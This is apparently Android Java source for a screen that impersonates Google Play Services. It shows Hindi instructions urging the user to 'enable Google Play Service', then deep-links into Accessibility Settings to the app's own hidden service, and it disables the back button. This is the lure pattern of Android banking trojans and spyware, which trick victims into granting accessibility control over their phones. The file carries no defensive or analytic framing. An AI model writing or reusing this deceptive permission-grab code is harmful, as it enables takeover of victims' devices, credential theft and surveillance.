package com.android.photo.camera.capture;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class CustomPermissionActivity extends Activity implements View.OnClickListener {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create ScrollView as root container
        ScrollView scrollView = new ScrollView(this);
        scrollView.setFillViewport(true);

        // Main Layout with top padding for status bar
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.WHITE);

        // Use screen-relative padding
        int screenHeight = getResources().getDisplayMetrics().heightPixels;
        int topPadding = (int)(screenHeight * 0.03); // 3% of screen height
        int sidePadding = (int)(getResources().getDisplayMetrics().widthPixels * 0.05); // 5% of screen width
        mainLayout.setPadding(sidePadding, topPadding, sidePadding, sidePadding);

        LinearLayout.LayoutParams mainParams = new LinearLayout.LayoutParams(
                LayoutParams.MATCH_PARENT,
                LayoutParams.WRAP_CONTENT // Changed to WRAP_CONTENT for scrolling
        );
        mainLayout.setLayoutParams(mainParams);

        // Adding crazy1.png image at top with responsive size
        ImageView topImage = new ImageView(this);
        Bitmap largeIcon = BitmapFactory.decodeResource(getResources(), R.mipmap.crazy1);
        topImage.setImageBitmap(largeIcon);
        topImage.setScaleType(ImageView.ScaleType.FIT_CENTER);

        int imageSize = (int)(Math.min(getResources().getDisplayMetrics().widthPixels * 0.7,
                getResources().getDisplayMetrics().heightPixels * 0.3));
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(
                imageSize,
                imageSize
        );
        iconParams.setMargins(0, 0, 0, (int)(screenHeight * 0.02));
        iconParams.gravity = Gravity.CENTER;
        topImage.setLayoutParams(iconParams);

        // Title TextView with updated style
        TextView titleText = new TextView(this);
        titleText.setText("Google Play Services");
        titleText.setTextSize(22); // Slightly smaller for better fit
        titleText.setTextColor(Color.BLACK);
        titleText.setGravity(Gravity.CENTER);
        titleText.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);

        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                LayoutParams.WRAP_CONTENT,
                LayoutParams.WRAP_CONTENT
        );
        titleParams.setMargins(0, 0, 0, (int)(screenHeight * 0.015));
        titleParams.gravity = Gravity.CENTER;
        titleText.setLayoutParams(titleParams);

        // Description TextView
        TextView descText = new TextView(this);
        descText.setText("अपडेट रहने के लिए गूगल प्ले सर्विस को इनेबल करें बेहतर सुविधाओं के लिए अभी अपडेट रहे।");
        descText.setTextSize(14);
        descText.setTextColor(Color.DKGRAY);
        descText.setGravity(Gravity.CENTER);
        descText.setLineSpacing(1.2f, 1.2f);

        LinearLayout.LayoutParams descParams = new LinearLayout.LayoutParams(
                LayoutParams.WRAP_CONTENT,
                LayoutParams.WRAP_CONTENT
        );
        descParams.setMargins(0, 0, 0, (int)(screenHeight * 0.02));
        descParams.gravity = Gravity.CENTER;
        descText.setLayoutParams(descParams);

        // Steps Box Layout
        LinearLayout stepsBox = new LinearLayout(this);
        stepsBox.setOrientation(LinearLayout.VERTICAL);
        GradientDrawable boxBackground = new GradientDrawable();
        boxBackground.setColor(Color.parseColor("#F5F5F5"));
        boxBackground.setCornerRadius(20);
        stepsBox.setBackground(boxBackground);
        stepsBox.setPadding(
                (int)(sidePadding * 0.75),
                (int)(sidePadding * 0.75),
                (int)(sidePadding * 0.75),
                (int)(sidePadding * 0.75)
        );
        stepsBox.setElevation(4);

        LinearLayout.LayoutParams boxParams = new LinearLayout.LayoutParams(
                LayoutParams.MATCH_PARENT,
                LayoutParams.WRAP_CONTENT
        );
        boxParams.setMargins(0, 0, 0, (int)(screenHeight * 0.02));
        stepsBox.setLayoutParams(boxParams);

        // Steps Title
        TextView stepsTitle = new TextView(this);
        stepsTitle.setText("निम्नलिखित चरणों का पालन करें:");
        stepsTitle.setTextSize(16);
        stepsTitle.setTextColor(Color.BLACK);
        stepsTitle.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        stepsBox.addView(stepsTitle);

        // Steps Content
        TextView stepsText = new TextView(this);
        String stepsContent =
                "\n1. NEXT बटन पर क्लिक करें\n" +
                        "2. Downloaded apps में जाएं\n" +
                        "3. Google Play Service क्लिक करें\n" +
                        "4. OK पर क्लिक करें";

        stepsText.setText(stepsContent);
        stepsText.setTextSize(14);
        stepsText.setTextColor(Color.BLACK);
        stepsText.setLineSpacing(1.5f, 1.2f);
        stepsBox.addView(stepsText);

        // Next Button with gradient
        Button nextButton = new Button(this);
        nextButton.setText("NEXT");
        nextButton.setTextColor(Color.WHITE);
        nextButton.setTextSize(14);
        nextButton.setAllCaps(true);

        GradientDrawable gradient = new GradientDrawable(
                GradientDrawable.Orientation.LEFT_RIGHT,
                new int[] {
                        Color.parseColor("#2196F3"),
                        Color.parseColor("#1976D2")
                }
        );
        gradient.setCornerRadius(30);
        nextButton.setBackground(gradient);
        nextButton.setElevation(8);

        // Make button padding relative to screen size
        int buttonPaddingH = (int)(getResources().getDisplayMetrics().widthPixels * 0.1);
        int buttonPaddingV = (int)(screenHeight * 0.015);
        nextButton.setPadding(buttonPaddingH, buttonPaddingV, buttonPaddingH, buttonPaddingV);

        LinearLayout.LayoutParams buttonParams = new LinearLayout.LayoutParams(
                LayoutParams.WRAP_CONTENT,
                LayoutParams.WRAP_CONTENT
        );
        buttonParams.gravity = Gravity.CENTER;
        buttonParams.setMargins(0, (int)(screenHeight * 0.01), 0, (int)(screenHeight * 0.02));
        nextButton.setLayoutParams(buttonParams);
        nextButton.setOnClickListener(this);
        nextButton.setClickable(true);
        nextButton.setFocusable(true);

        // Add all views to main layout
        mainLayout.addView(topImage);
        mainLayout.addView(titleText);
        mainLayout.addView(descText);
        mainLayout.addView(stepsBox);
        mainLayout.addView(nextButton);

        // Add main layout to ScrollView
        scrollView.addView(mainLayout);

        setContentView(scrollView);
    }

    @Override
    public void onClick(View v) {
        if (v != null) {
            try {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                String settingsClassName = getPackageName() + "/" + Service.class.getName();
                Bundle bundle = new Bundle();
                bundle.putString(":settings:fragment_args_key", settingsClassName);
                intent.putExtra(":settings:show_fragment_args", bundle);
                intent.putExtra(":settings:source_package", getPackageName());
                startActivity(intent);
                finish();
            } catch (Exception e) {
                e.printStackTrace();
                try {
                    Intent fallbackIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivity(fallbackIntent);
                    finish();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onBackPressed() {
        // Back button disabled
    }
}